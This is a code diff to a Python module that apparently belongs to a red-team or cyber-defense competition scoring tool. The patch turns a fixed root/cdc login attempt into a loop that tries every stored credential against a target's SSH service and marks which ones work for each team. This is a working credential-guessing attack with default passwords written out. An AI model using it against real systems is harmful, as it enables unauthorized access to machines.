@@ -2,6 +2,8 @@ from typing import Tuple
 
 import paramiko
 
+from .credentials import CredentialBag
+
 
 def _get_ssh_client():
     ssh = paramiko.SSHClient()
@@ -9,21 +11,27 @@ def _get_ssh_client():
     return ssh
 
 
-def pwn_ssh(url: str, port: int) -> Tuple[str, bool, bool]:
+def pwn_ssh(url: str, port: int, team: int) -> Tuple[str, bool, bool]:
     ssh = _get_ssh_client()
+    bag = CredentialBag.get_instance()
 
-    try:
-        ssh.connect(url, port=port, username='root', password='cdc')
-        return 'Found valid user: root', True, False
-    except:
+    working = 0
+    for credential in bag.credentials():
         try:
-            ssh.connect(url, port=port, username='cdc', password='cdc')
-            return 'Found valid user: cdc', True, False
+            print("Trying credential:", credential)
+            ssh.connect(url, port=port, username=credential.username, password=credential)
+            credential.mark_works(team)
+            print("Working credential:", credential)
+            working += 1
         except:
-            return 'Authentication failed', False, False
+            continue
+
+    if working:
+        return "Found credentials", True, False
+    else:
+        return 'Authentication failed', False, False
 
 
 PWN_FUNCS = {
     'ssh': pwn_ssh,
 }
-
